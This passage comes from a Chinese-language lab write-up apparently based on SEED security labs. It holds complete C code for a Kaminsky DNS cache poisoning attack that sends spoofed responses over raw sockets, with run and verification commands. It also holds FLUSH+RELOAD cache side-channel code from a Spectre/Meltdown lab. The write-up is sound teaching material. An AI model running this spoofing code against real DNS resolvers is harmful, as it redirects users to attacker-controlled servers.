Attack</h4><p>现在我们可以把所有的东西放在一起发动Kaminsky 袭击了。在攻击中，我们需要发送许多伪造的DNS回复，希望其中一个response命中正确的事务ID，并比合法response更早到达。</p><p>因此，速度是至关重要的：我们可以发送的数据包越多，成功率就越高。如果我们像以前的task一样使用Scapy发送伪造的DNS response，成功率太低。所以我们需要使用混合的方法，我们首先使用Scapy生成一个DNS数据包模板，该模板存储在一个文件中。然后，我们将这个模板加载到C程序中，对一些字段进行一些小的更改，然后发送数据包。</p><p>要检查攻击是否成功，我们需要检查dump.db文件，看看我们伪造的DNS响应是否已被DNS服务器成功接受。</p><p><strong>实验步骤：</strong></p><p>需要生成二进制数据包文件，以便待会儿C程序读取使用，</p><p>编写C程序，实现Kaminsky Attack，</p><p>首先分析二进制数据包的结构：</p><ul><li><p>事务ID的位置：</p></li><li><p>查询子域名的位置：</p><p>使用hexdump查看的二进制文件是小端存储的，</p><ul><li><p>Request包：<br>域名位于0x29（41）的位置，</p></li><li><p>Response包：<br>域名位于0x40（64）的位置，</p></li></ul></li></ul><p>构建attack.c代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_FILE_SIZE 1000000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* IP Header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>      iph_ihl:<span class="number">4</span>, <span class="comment">//IP header length</span></span><br><span class="line">                     iph_ver:<span class="number">4</span>; <span class="comment">//IP version</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>      iph_tos; <span class="comment">//Type of service</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_len; <span class="comment">//IP Packet length (data + header)</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_ident; <span class="comment">//Identification</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_flag:<span class="number">3</span>, <span class="comment">//Fragmentation flags</span></span><br><span class="line">                     iph_offset:<span class="number">13</span>; <span class="comment">//Flags offset</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>      iph_ttl; <span class="comment">//Time to Live</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>      iph_protocol; <span class="comment">//Protocol type</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_chksum; <span class="comment">//IP datagram checksum</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span>  <span class="title">in_addr</span>    <span class="title">iph_sourceip</span>;</span> <span class="comment">//Source IP address </span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span>  <span class="title">in_addr</span>    <span class="title">iph_destip</span>;</span>   <span class="comment">//Destination IP address </span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">send_raw_packet</span><span class="params">(<span class="type">char</span> * buffer, <span class="type">int</span> pkt_size)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">send_dns_request</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * buffer,<span class="type">int</span> pkt_size,<span class="type">char</span> * name)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">send_dns_response</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * buffer,<span class="type">int</span> pkt_size,<span class="type">char</span> * name,<span class="type">unsigned</span> <span class="type">int</span> id)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  srand(time(<span class="literal">NULL</span>));</span><br><span class="line">  FILE * f_req = fopen(<span class="string">&quot;ip_req.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!f_req) &#123;</span><br><span class="line">     perror(<span class="string">&quot;Can&#x27;t open &#x27;ip_req.bin&#x27;&quot;</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> ip_req[MAX_FILE_SIZE];</span><br><span class="line">  <span class="type">int</span> n_req = fread(ip_req, <span class="number">1</span>, MAX_FILE_SIZE, f_req);</span><br><span class="line">  FILE * f_resp = fopen(<span class="string">&quot;ip_resp.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!f_resp) &#123;</span><br><span class="line">     perror(<span class="string">&quot;Can&#x27;t open &#x27;ip_resp.bin&#x27;&quot;</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> ip_resp[MAX_FILE_SIZE];</span><br><span class="line">  <span class="type">int</span> n_resp = fread(ip_resp, <span class="number">1</span>, MAX_FILE_SIZE, f_resp);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> a[<span class="number">26</span>]=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line"> <span class="type">char</span> name[<span class="number">6</span>];</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// Generate a random name with length 5</span></span><br><span class="line">    <span class="built_in">memset</span>(name,<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k=<span class="number">0</span>; k&lt;<span class="number">5</span>; k++)  name[k] = a[rand() % <span class="number">26</span>];</span><br><span class="line">send_dns_request(ip_req,n_req,name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;request for %s.example.com\n&quot;</span>,name);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">unsigned</span> <span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">65536</span>;i++)&#123;</span><br><span class="line">send_dns_response(ip_resp,n_resp,name,i);</span><br><span class="line">&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">send_dns_request</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * buffer,<span class="type">int</span> pkt_size,<span class="type">char</span> * name)</span>&#123;</span><br><span class="line"><span class="built_in">memcpy</span>(buffer+<span class="number">41</span>,(<span class="type">unsigned</span> <span class="type">char</span>*)name,<span class="number">5</span>);</span><br><span class="line">send_raw_packet(buffer,pkt_size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">send_dns_response</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * buffer,<span class="type">int</span> pkt_size,<span class="type">char</span> * name,<span class="type">unsigned</span> <span class="type">int</span> id)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> tmp[<span class="number">2</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">*tmp=htons(id);</span><br><span class="line"><span class="built_in">memcpy</span>(buffer+<span class="number">28</span>,(<span class="type">void</span>*)tmp,<span class="number">2</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(buffer+<span class="number">41</span>,(<span class="type">unsigned</span> <span class="type">char</span>*)name,<span class="number">5</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(buffer+<span class="number">64</span>,(<span class="type">unsigned</span> <span class="type">char</span>*)name,<span class="number">5</span>);</span><br><span class="line">send_raw_packet(buffer,pkt_size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">send_raw_packet</span><span class="params">(<span class="type">char</span> * buffer, <span class="type">int</span> pkt_size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest_info</span>;</span></span><br><span class="line">  <span class="type">int</span> enable = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step 1: Create a raw network socket.</span></span><br><span class="line">  <span class="type">int</span> sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step 2: Set socket option.</span></span><br><span class="line">  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,</span><br><span class="line">     &amp;enable, <span class="keyword">sizeof</span>(enable));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step 3: Provide needed information about destination.</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> *<span class="title">ip</span> =</span> (<span class="keyword">struct</span> ipheader *) buffer;</span><br><span class="line">  dest_info.sin_family = AF_INET;</span><br><span class="line">  dest_info.sin_addr = ip-&gt;iph_destip;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step 4: Send the packet out.</span></span><br><span class="line">  sendto(sock, buffer, pkt_size, <span class="number">0</span>,</span><br><span class="line">       (<span class="keyword">struct</span> sockaddr *)&amp;dest_info, <span class="keyword">sizeof</span>(dest_info));</span><br><span class="line">  close(sock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（注释掉printf为了更快地发送数据包）</p><p>编译attack.c文件，使用root权限运行，</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc attack.c -o attack</span><br><span class="line"><span class="built_in">sudo</span> ./attack</span><br></pre></td></tr></table></figure><p>同时在开设本地DNS服务的container中使用命令查看本地的缓存情况，</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rndc dumpdb -cache &amp;&amp; grep attacker /var/cache/bind/dump.db</span><br></pre></td></tr></table></figure><p>发现缓存中已经将攻击者控制的DNS服务器作为example.com的权威服务器了， </p><p>在我们的生成DNS回复数据包中，Answer Section中对查询的子域名的答案永远是固定值1.2.3.4，</p><p>在本地DNS缓存中看到<code>ubznm.example.com</code>等子域名对应的IP为1.2.3.6的缓存是来自<code>ns.attacker32.com</code>的，也可以证明DNS 缓存被成功污染了。</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-05 22.57.40.png" alt="截屏2025-01-05 22.57.40" style="zoom:33%;" /><p>如果想知道我们的攻击程序在哪一个子域名回复的数据包猜中了，可以在缓存中查找1.2.3.4</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-05 22.57.25.png" alt="截屏2025-01-05 22.57.25" style="zoom:33%;" /><p>如图，那么本地DNS服务器就是先发送了对<code>svwpt.example.com</code>的DNS查询，但是伪造的对<code>svwpt.example.com</code>查询的DNS回复比官方的回复更早抵达，并且携带着正确的事务ID，所以本地DNS服务器就接收了该数据包，并且把数据包中的恶意nameserver写入了缓存，即攻击成功。</p><p><strong>在实验中遇到的一些问题：</strong></p><p>实验不成功的问题就在二进制数据包的chksum；</p><p>在使用生成数据包的时候，如果不指定chksum为0，那么scapy会自动计算chksum然后填入数据包，可以使用命令<code>hexdump</code>查看二进制数据包；</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-05 22.59.10.png" alt="截屏2025-01-05 22.59.10" style="zoom:33%;" /><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-05 22.59.26.png" alt="截屏2025-01-05 22.59.26" style="zoom:33%;" /><p>scapy在构成数据包的时候，如果没有指定chksum的值，那么chksum为None，scapy会根据数据包的内容自动生成chksum。但是，如果指定UDP报文中的chksum为0，那么该scapy会使其为0，不会自动计算；</p><blockquote><p>当UDP头部的校验和为0时，代表着对方没有进行校验和计算（可能是为了调试，或者是更高层的协议并不关心此校验和）；</p></blockquote><p>**经过多次尝试，发现如果事先在gen_dns_response.py代码中指定生成的数据包中的UDP chksum的值为0，那么攻击很快就成功了；**如果没有指定UDP chksum的值，让scapy根据数据包自己生成对应的chksum，那么攻击一直无法成功。</p><h4 id="Task5-Result-Verification"><a href="#Task5-Result-Verification" class="headerlink" title="Task5. Result Verification"></a>Task5. Result Verification</h4><p>攻击成功之后，在本地DNS服务器的DNS缓存中，example.com的NS记录将变为ns.attacker32.com。当该服务器接收到example.com域内任何主机名的DNS查询时，它将向ns.attack32.com发送查询，而不是发送到域的合法nameserver；</p><p>可以通过在user container中使用dig命令发送example.com域下的子域名的DNS查询报文；</p><p>要验证攻击是否成功，需要在user container中运行以下两个dig命令。</p><p>在响应中，两个命令的<code>www.example.com</code>的IP地址应该相同，并且应该是攻击者名称服务器上zone文件定义的地址；</p><ul><li><p>user执行<code>dig www.example.com</code>，local dns返回的结果为attacker ns中配置的1.2.3.5，因为local dns在看到example.com时会直接向缓存中attacker dns询问；</p></li><li><p>user执行<code>dig @ns.attacker32.com www.example.com</code>，attacker dns返回1,2,3,5</p></li></ul><p>回复的结果相同；</p><hr><p>使用不在缓存中的子域名，<code>imwzh.example.com</code>和<code>12345.example.com</code>，结果如下，ip的输出值都为<code>1.2.3.6</code>，</p><p>下面使用wireshark对数据包进行抓取，使用一个还没有存在本地dns服务器上的域名<code>wuzhh.example.com</code>，</p><p>四个数据包分别表明：</p><ol><li>user container使用dig命令，使得DNS request从user container发出，目的地为本地DNS服务器 本地DNS服务器收到DNS request之后，查看缓存，发现没有查询对象的IP地址。但是有对应域的权威DNS服务器记录。</li><li>所以本地DNS服务器将该DNS request转发至权威DNS服务器（攻击者控制的服务器）</li><li>攻击者控制的服务器将DNS response返回给本地DNS服务器</li><li>本地DNS服务器收到DNS response之后，将其存入缓存，然后将response转发给user container</li></ol><p>也就是说，本地DNS服务器在被攻击成功后会向攻击者的nameserver发起对应域下的DNS查询，而不是官方的nameserver；</p><p>至此，简化的卡明斯基攻击实验就完成了。</p><h2 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h2><h3 id="DNS层次结构："><a href="#DNS层次结构：" class="headerlink" title="DNS层次结构："></a><strong>DNS层次结构：</strong></h3><ul><li>根域名：有13个DNS根服务器</li><li>顶级域TLD：<ul><li>基础结构：arpa</li><li>通用：.com .net</li><li>赞助：.edu .gov .mail</li><li>国家代码：.cn .us</li><li>保留：.example .localhost</li></ul></li><li>二级域名</li></ul><p>权威名称服务器：提供DNS查询的原始和最终答案(每个域中至少有一个)</p><h3 id="DNS攻击"><a href="#DNS攻击" class="headerlink" title="DNS攻击"></a><strong>DNS攻击</strong></h3><ul><li><p>拒绝服务攻击：使本地DNS服务器和权威名称服务器无法响应DNS查询</p></li><li><p>DNS欺骗：向受害者提供欺诈性IP地址，诱使他们与不同于他们意图的机器进行通信</p></li><li><p>如果攻击者获得了机器的根权限，可以修改 &#x2F;etc&#x2F;resolv.conf和 &#x2F;etc&#x2F;hosts</p></li><li><p>来自恶意DNS服务器的回复伪造攻击：恶意DNS Server在Authority Section和Additional Section中提供伪造数据</p></li><li><p>反向DNS查找中的应答伪造：如果数据包来自攻击者，则反向DNS查找将返回到攻击者的名称服务器。 攻击者可以使用他们想要的任何主机名进行回复。</p></li><li><p>DNS重新绑定攻击：可以绕过同源策略。</p></li><li><p>DNS缓存中毒攻击：具体见下方</p><ul><li><p>本地DNS缓存中毒攻击：在看到来自本地DNS的查询后伪造DNS应答(Answer Section和Authority Section)</p></li><li><p>远程DNS缓存中毒攻击：需要猜测查询数据包使用的两个随机数，<strong><u><em>源端口号和事务ID</em></u></strong>。如果一次尝试失败，local DNS 将缓存实际回复；攻击者需要等待缓存超时以进 行下一次尝试。</p></li></ul></li></ul><h1 id="Lab12-幽灵与熔断攻击"><a href="#Lab12-幽灵与熔断攻击" class="headerlink" title="Lab12-幽灵与熔断攻击"></a>Lab12-幽灵与熔断攻击</h1><h2 id="Task1-2-Side-Channel-Attacks-via-CPU-Caches"><a href="#Task1-2-Side-Channel-Attacks-via-CPU-Caches" class="headerlink" title="Task1&amp;2. Side Channel Attacks via CPU Caches"></a>Task1&amp;2. Side Channel Attacks via CPU Caches</h2><p>幽灵攻击和熔断攻击都使用CPU cache作为侧信道以盗取被保护的秘密信息。在侧信道攻击用到的技术为<em><strong>FLUSH+RELOAD</strong></em>。</p><blockquote><p>CPU cache是用于减少计算机从主存获取信息的平均耗时的，从CPU cache里读取数据比从主存中读取快得多。现代的CPU基本都有缓存功能。</p></blockquote><h3 id="Task1-Reading-from-Cache-versus-from-Memory"><a href="#Task1-Reading-from-Cache-versus-from-Memory" class="headerlink" title="Task1. Reading from Cache versus from Memory"></a>Task1. Reading from Cache versus from Memory</h3><p>缓存使得处理器可以快速地获取数据。在本次实验中的<code>CacheTime.c</code>程序中，设置了一个大小为<code>4096*10</code>的数组。我们先访问它的<code>array [3*4096]</code>和<code>array[7*4096]</code>。这样携带两个元素的页就会被缓存，然后我们从<code>array [0*4096]</code>读到<code>array [9*4096]</code>，记录读取所花费的时间。</p><p><code>CacheTime.c</code>代码如下，</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">10</span>*<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  <span class="type">int</span> junk=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="comment">// Initialize the array</span></span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span>]=<span class="number">1</span>;</span><br><span class="line">  <span class="comment">// FLUSH the array from the CPU cache</span></span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span>]);</span><br><span class="line">  <span class="comment">// Access some of the array items</span></span><br><span class="line">  <span class="built_in">array</span>[<span class="number">3</span>*<span class="number">4096</span>] = <span class="number">100</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">7</span>*<span class="number">4096</span>] = <span class="number">200</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++) &#123;</span><br><span class="line">    addr = &amp;<span class="built_in">array</span>[i*<span class="number">4096</span>];</span><br><span class="line">    time1 = __rdtscp(&amp;junk);   junk = *addr;</span><br><span class="line">    time2 = __rdtscp(&amp;junk) - time1;  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Access time for array[%d*4096]: %d CPU cycles\n&quot;</span>,i, (<span class="type">int</span>)time2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>定义10个内存块(**<u><em>一个内存块64Byte，4096bit)</em></u>**大小的数组并初始化：<br><code>uint8_t array[10*4096];</code></p></li><li><p>将数组从CPU缓存中清除：<br><code>for(i=0; i&lt;10; i++) _mm_clflush(&amp;array[i*4096]);</code></p></li><li><p>访问一下内存块3和内存块7<br><code>array[3*4096] = 100;array[7*4096] = 200;</code></p></li><li><p>重新访问所有内存块，并计算访问每个内存块使用的时间(CPU时钟)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++) &#123;</span><br><span class="line">    addr = &amp;<span class="built_in">array</span>[i*<span class="number">4096</span>];</span><br><span class="line">    time1 = __rdtscp(&amp;junk);   junk = *addr;</span><br><span class="line">    time2 = __rdtscp(&amp;junk) - time1;  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Access time for array[%d*4096]: %d CPU cycles\n&quot;</span>,i, (<span class="type">int</span>)time2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验步骤：</strong></p><p>编译并执行<code>CacheTime.c</code>，命令为</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -march=native CacheTime.c -o t1</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-06 15.18.38.png" alt="截屏2025-01-06 15.18.38" style="zoom:33%;" /><p>从结果发现，访问已经缓存过的<code>array [3*4096]</code>与<code>array [7*4096]</code>耗时比访问其他位置耗时短得多。</p><p><strong>分析：</strong></p><p>可以看到，通过CPU cache取得数据所花费的时间大概为20-100个CPU时钟，而通过RAM获取数据需要花费至少100多个CPU时钟，大部分情况是200多个CPU时钟，也偶尔有1000多CPU时钟的情况，可能是触发了其他的内存操作，或者那个数据需要在更下层的存储结构中寻找。</p><p>所以可以将阈值确定为80左右个CPU时间，访问时间大于阈值的内存块没有被缓存，访问时间小于阈值的内存块大概率是提前被缓存了。</p><h3 id="Task2-Using-Cache-as-a-Side-Channel"><a href="#Task2-Using-Cache-as-a-Side-Channel" class="headerlink" title="Task2. Using Cache as a Side Channel"></a>Task2. Using Cache as a Side Channel</h3><p>本次task的目的是使用侧信道提取被攻击函数中的秘密值。假设有一个函数（称之为victim函数）将一个秘密的值作为索引从数组中读取数据，并且这个秘密值不能被外界所知。我们的目标就是通过侧信道获得这个秘密值。</p><p>所使用到的技术被称为FLUSH+RELOAD。下图展示了这项技术的关键步骤：</p><ol><li>将整个数组从缓存中FLUSH掉；</li><li>调用victim函数，它会访问以秘密值为索引的那个数组元素。这会使得对应的数组元素被缓存；</li><li>RELOAD整个数组，并且记录访问每一个元素的时间。如果某一个元素的访问时间非常短，那么很有可能它本身就在缓存中。那这个元素必然就是刚才victim函数中访问的数组元素，也就是说，它的索引值就是秘密值。</li></ol><p>下面的程序利用FLUSH+RELOAD技术找出了变量secret中包含的一字节秘密值。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">256</span>*<span class="number">4096</span>];</span><br><span class="line"><span class="type">int</span> temp;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> secret = <span class="number">94</span>;</span><br><span class="line"><span class="comment">/* cache hit time threshold assumed*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CACHE_HIT_THRESHOLD (80)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">victim</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  temp = <span class="built_in">array</span>[secret*<span class="number">4096</span> + DELTA];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">flushSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="comment">// Write to array to bring it to RAM to prevent Copy-on-write</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA] = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">//flush the values of the array from cache</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> +DELTA]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> junk=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">   addr = &amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA];</span><br><span class="line">   time1 = __rdtscp(&amp;junk);</span><br><span class="line">   junk = *addr;</span><br><span class="line">   time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">   <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>, i, DELTA);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The Secret = %d.\n&quot;</span>,i);</span><br><span class="line">   &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">  flushSideChannel();</span><br><span class="line">  victim();</span><br><span class="line">  reloadSideChannel();</span><br><span class="line">  <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>程序首先调用<code>flushSideChannel</code>函数，定义好数组并且将缓存清理掉。</li><li>然后调用<code>victim</code>函数，访问了以secret作为索引的一部分访问了数组元素。</li><li>最后调用<code>reloadSideChannel</code>函数，重新访问数组，目的是找出那一个内存块被缓存了，然后根据索引推断出secret。</li></ul><p>由于大小为一个字节的秘密值有 256 个可能的值，因此我们需要将每个值映射到一个数组元素。最简单的方法是定义一个包含 256 个元素的数组（即 array[256]）。</p><p>&#x3D;&#x3D;然而，这是行不通的。&#x3D;&#x3D;**<em>缓存是在块级别完成的，而不是在字节级别完</em>成的（一个内存块的大小是64Btyes）。**如果访问 array[k]，则包含该元素的内存块将被缓存。因此，array[k]的相邻元素也会被缓存，从而很难推断出秘密是什么。为了解决这个问题，我们创建一个<code> 256*4096</code> 字节的数组。 RELOAD 步骤中使用的每个元素都是 <code>array[k*4096]</code>。由于 4096 大于典型的缓存块大小（64 字节），因此两个不同的元素 <code>array[i*4096]</code> 和<code>array[j*4096]</code>不会位于同一缓存块中。</p><p>&#x3D;&#x3D;由于<code>array[0*4096] </code>可能与相邻内存中的变量落入同一个缓存块&#x3D;&#x3D;，因此可能会由于这些变量的缓存而被意外缓存。因此，我们应该避免在FLUSH+RELOAD方法中使用<code>array[0*4096]</code>（对于其他索引k，<code>array[k*4096]</code>没有问题）。为了在程序中保持一致，我们对所有 k 值使用 <code>array[k*4096 + DELTA]</code>，其中 DELTA 定义为常量 1024。</p><p><strong>实验步骤：</strong></p><p>分析<code>FlushReload.c</code>：</p><ol><li>建立数组内存块并写入内容。<code>DELTA</code>是使读写内容偏移到一块的中间位置。</li><li>将数组从CPU缓存中清除。</li><li>从RAM中读取数组中的一个值(攻击目标、Secret)，此时这一块被放入CPU缓存。</li><li>重新访问所有内存块，并计算访问每个内存块使用的时间(CPU时钟)。如果使用的时间小于某个阈值(根据上一个Task的观察和自己机器的实际情况自定义)，就认为这一块已在CPU缓存中。</li></ol><p>在代码中，定义的阈值为80个CPU时钟，编译c文件，命令如下，</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc FlushReload.c -o t2</span><br></pre></td></tr></table></figure><p>发现Secret&#x3D;94，与C程序里定义的一致，实验成功。</p><p><strong>分析：</strong></p><p>原理同Task1，这种攻击利用了 CPU 缓存行的行为，在攻击者预先清空缓存后，根据访问某些敏感数据的<strong>时间</strong>来推断数据是否在缓存中，从而暴露了数据的敏感性。</p><h2 id="Task3-Out-of-Order-Execution-and-Branch-Prediction"><a href="#Task3-Out-of-Order-Execution-and-Branch-Prediction" class="headerlink" title="Task3. Out-of-Order Execution and Branch Prediction"></a>Task3. Out-of-Order Execution and Branch Prediction</h2><p>此task的目标是了解CPU的乱序执行。</p><h3 id="Out-Of-Order-Execution"><a href="#Out-Of-Order-Execution" class="headerlink" title="Out-Of-Order 